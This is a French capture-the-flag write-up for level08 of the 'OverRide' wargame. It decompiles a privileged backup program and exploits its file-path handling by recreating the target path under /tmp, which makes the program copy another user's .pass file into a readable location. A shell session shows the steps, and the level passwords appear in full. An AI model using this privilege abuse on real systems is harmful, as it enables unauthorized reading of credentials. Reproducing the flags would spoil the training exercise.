```
level08 : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

![](Pasted%20image%2020240809055909.png)

```c
int main(int param_1,char **param_2)

{
  char cVar1;
  int fd;
  int iVar2;
  FILE *log_file;
  FILE *pass_file;
  ulong uVar3;
  undefined8 *puVar4;
  long in_FS_OFFSET;
  byte bVar5;
  char char_pass;
  char prefixeFile[] = "./backups/";
  undefined2 local_70;
  char local_6e;
  long canary;
  
  bVar5 = 0;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  char_pass = -1;
  if (param_1 != 2) {
    printf("Usage: %s filename\n",*param_2);
  }
  log_file = fopen("./backups/.log","w");
  if (log_file == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n","./backups/.log");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  log_wrapper(log_file,"Starting back up: ",param_2[1]);
  pass_file = fopen(param_2[1],"r");
  if (pass_file == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }

  uVar3 = -1;
  puVar4 = &prefixeFile;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *(char *)puVar4;
    puVar4 = (undefined8 *)((long)puVar4 + (ulong)bVar5 * -2 + 1);
  } while (cVar1 != '\0');
  strncat((char *)&prefixeFile,param_2[1],99 - (~uVar3 - 1));
  fd = open((char *)&prefixeFile,0xc1,0x1b0);
  if (fd < 0) {
    printf("ERROR: Failed to open %s%s\n","./backups/",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    iVar2 = fgetc(pass_file);
    char_pass = (char)iVar2;
    if (char_pass == -1) break;
    write(fd,&char_pass,1);
  }
  log_wrapper(log_file,"Finished back up ",param_2[1]);
  fclose(pass_file);
  close(fd);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
int main(int param_1,char **param_2)

{
  char cVar1;
  int fd;
  int iVar2;
  FILE *log_file;
  FILE *pass_file;
  ulong uVar3;
  undefined8 *puVar4;
  long in_FS_OFFSET;
  byte bVar5;
  char char_pass;
  undefined8 prefixeFile;
  undefined2 local_70;
  char local_6e;
  long canary;
  
  bVar5 = 0;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  char_pass = -1;
  if (param_1 != 2) {
    printf("Usage: %s filename\n",*param_2);
  }
  log_file = fopen("./backups/.log","w");
  if (log_file == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n","./backups/.log");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  log_wrapper(log_file,"Starting back up: ",param_2[1]);
  pass_file = fopen(param_2[1],"r");
  if (pass_file == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  prefixeFile._0_1_ = '.';
  prefixeFile._1_1_ = '/';
  prefixeFile._2_1_ = 'b';
  prefixeFile._3_1_ = 'a';
  prefixeFile._4_1_ = 'c';
  prefixeFile._5_1_ = 'k';
  prefixeFile._6_1_ = 'u';
  prefixeFile._7_1_ = 'p';
  local_70._0_1_ = 's';
  local_70._1_1_ = '/';
  local_6e = '\0';
  uVar3 = 0xffffffffffffffff;
  puVar4 = &prefixeFile;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *(char *)puVar4;
    puVar4 = (undefined8 *)((long)puVar4 + (ulong)bVar5 * -2 + 1);
  } while (cVar1 != '\0');
  strncat((char *)&prefixeFile,param_2[1],99 - (~uVar3 - 1));
  fd = open((char *)&prefixeFile,0xc1,0x1b0);
  if (fd < 0) {
    printf("ERROR: Failed to open %s%s\n","./backups/",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    iVar2 = fgetc(pass_file);
    char_pass = (char)iVar2;
    if (char_pass == -1) break;
    write(fd,&char_pass,1);
  }
  log_wrapper(log_file,"Finished back up ",param_2[1]);
  fclose(pass_file);
  close(fd);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

On peux voir que le main regarde que nous avons bien fourni un argument au lancement du programme.
Cet argument va être utiliser dans un "open" en mode read donc on doit lui donner un fichier.

On remarque également qu'un fichier .log est également open ou créer a l'emplacement "./backups/" avec des droit d’écriture.

On vois aussi un 3eme open qui est effectué en mode write mais cette fois-ci le nom de fichier est une concaténation de la string "./backups/" et notre argument. Dans ce fichier on remarque qu'il est écrit ce que contient le fichier de l'argument caractère par caractère.

Le but serai donc de charger le fichier .pass du level09 pour qu'il inscrit sont contenu dans un nouveau fichier que nous allons pouvoir ouvrir.

```
level08@OverRide:/tmp$ mkdir -p /tmp/home/users/level09/
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp$
```

```
level09 : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```